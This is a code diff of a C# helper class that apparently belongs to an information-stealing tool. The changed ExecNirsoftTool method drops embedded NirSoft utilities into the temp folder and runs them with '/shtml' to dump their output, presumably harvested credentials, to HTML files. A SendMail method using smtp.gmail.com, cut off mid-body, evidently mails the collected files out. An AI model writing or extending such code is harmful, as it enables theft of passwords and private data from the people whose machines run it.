@@ -8,19 +8,15 @@ namespace TP
 {
     internal class Helpers
     {
-        public static void openCalc()
-        {
-            Process.Start("calc");
-        }
 
-        public static List<string> applyDataExtractionActions(List<DataExtractor> dataExtractors, List<string> nirsoftExecutablePaths)
+        public static List<string> ApplyDataExtractionActions(List<DataExtractor> dataExtractors, List<string> nirsoftExecutablePaths)
         {
             List<string> extractedDataFiles = new List<string>();
             foreach (DataExtractor dataExtractor in dataExtractors)
                 extractedDataFiles.Add(dataExtractor.ExtractDataAndGetFileName());
 
-            foreach (string executablePath in nirsoftExecutablePaths)
-                extractedDataFiles.Add(Helpers.execNirsoftTool(executablePath));
+            foreach (string resource in nirsoftExecutablePaths)
+                extractedDataFiles.Add(Helpers.ExecNirsoftTool(resource));
 
             return extractedDataFiles;
         }
@@ -31,18 +27,22 @@ namespace TP
                 File.Delete(filePath);
         }
 
-        public static string execNirsoftTool(string executablePath)
+        public static string ExecNirsoftTool(string nirsoftTool)
         {
-            string file = Path.GetFileNameWithoutExtension(executablePath).ToLower() + ".html";
+            string path = Path.Combine(Path.GetTempPath(), nirsoftTool + ".exe");
+            File.WriteAllBytes(path, (byte[]) TP.Properties.Resources.ResourceManager.GetObject(nirsoftTool));
+
+            string file = path.Replace("exe", "html");
             ProcessStartInfo startInfo = new ProcessStartInfo();
-            startInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, executablePath);
+            startInfo.FileName = path;
             startInfo.Arguments = @"/shtml " + file;
             var process = Process.Start(startInfo);
             process.WaitForExit();
+
             return file;
         }
 
-        public static void sendMail(string subject, string message, List<string> files)
+        public static void SendMail(string subject, string message, List<string> files)
         {
             MailMessage mail = new MailMessage();
             SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
